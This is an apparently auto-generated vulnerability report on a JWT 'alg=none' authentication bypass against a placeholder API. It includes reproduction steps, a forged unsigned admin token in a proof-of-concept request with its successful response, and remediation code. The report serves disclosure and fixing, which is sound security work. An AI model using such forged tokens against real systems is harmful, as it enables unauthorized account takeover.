# JWT Authentication Bypass via alg=none

## Summary

The application accepts JWT tokens with 'alg' header set to 'none'. This allows an attacker to forge valid tokens without knowing the secret key.

## Vulnerability Type

- **Type**: JWT Algorithm Confusion (alg=none)
- **Category**: Broken Authentication
- **CWE**: [CWE-347](https://cwe.mitre.org/data/definitions/347.html)

## Severity

🔴 **CRITICAL** (CVSS: 9.0-10.0)

## Steps to Reproduce

1. Intercept a valid JWT token from the application
2. Decode the JWT header using Base64
3. Change 'alg' field from 'HS256' to 'none'
4. Remove the signature portion (everything after the second '.')
5. Send the modified token: Bearer eyJhbGciOiJub25lI...
6. Observe successful authentication as admin user

## Impact

An attacker can bypass authentication entirely by forging JWT tokens. This allows unauthorized access to any user account, including admin accounts. Full account takeover is possible, leading to complete compromise of user data.

## Proof of Concept

### Request
```http
GET https://api.example.com/users/me
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
```

### Response
```http
HTTP/1.1 200

{"id": 1, "username": "admin", "role": "admin"}
```

## Remediation

1. **Explicitly specify the algorithm** when verifying JWT tokens. Never accept the algorithm from the token header.
2. Use a JWT library that requires algorithm specification.
3. Example (Node.js):
```javascript
jwt.verify(token, secret, { algorithms: ['HS256'] })
```

---

## Technical Details

- **Target URL**: https://api.example.com/users/me
- **Discovered**: 2025-12-20 23:20:06
- **Confidence**: 95%
- **Detection Method**: jwt_inspector

### Additional Information

- **alg_variant**: `none`
- **original_alg**: `HS256`
- **rag_assisted**: `True`